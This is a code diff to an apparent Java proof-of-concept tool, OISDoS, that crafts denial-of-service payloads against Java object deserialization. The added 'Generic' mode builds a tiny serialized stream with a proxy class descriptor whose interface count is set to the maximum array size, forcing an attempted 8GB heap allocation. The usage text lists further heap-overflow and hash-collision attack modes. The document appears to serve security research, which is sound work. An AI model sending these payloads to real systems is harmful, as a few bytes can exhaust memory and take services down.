@@ -7,10 +7,12 @@ import cz.topolik.oisdos.OISHeapOverflowAttack;
 import org.apache.commons.codec.binary.Base64;
 
 import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.EOFException;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.OptionalDataException;
+import java.nio.ByteBuffer;
 
 
 /**
@@ -28,6 +30,7 @@ public class OISDoS {
 		if (type == null) {
 			System.out.println("Syntax: OISDoS type [param]");
 			System.out.println("\t type");
+			System.out.println("\t\t ... Generic - Heap Overflow using proxyClassDesc interfaces number (fixed to 8GB)");
 			System.out.println("\t\t ... ObjectArrayHeap - Heap Overflow using Object[]");
 			System.out.println("\t\t ... ArrayListHeap - Heap Overflow using ArrayList");
 			System.out.println("\t\t ... HashMapHeap - Heap Overflow using HashMap");
@@ -40,6 +43,20 @@ public class OISDoS {
 			System.out.println("\t\t ... for HashtableCollisions ... number of entries for collision, default 10000");
 			System.out.println("\t\t ... for HashMapCollisions ... number of entries for collision, default 10000");
 			System.exit(1);
+		}
+
+		if ("Generic".equalsIgnoreCase(type)) {
+			byte[] payload = ByteBuffer.allocate(9)
+				.putShort((short) 0xACED) // STREAM_MAGIC
+				.putShort((short) 0x0005) // STREAM_VERSION
+				.put((byte)0x7D) // TC_PROXYCLASSDESC
+				.putInt(OISHeapOverflowAttack.MAX_ARRAY_SIZE).array();
+
+			System.out.print("Generating Generic heap overflow (8GB) using a payload of size ");
+
+			System.out.println(payload.length);
+
+			read(payload);
 		}
 
 		if ("ObjectArrayHeap".equalsIgnoreCase(type)) {
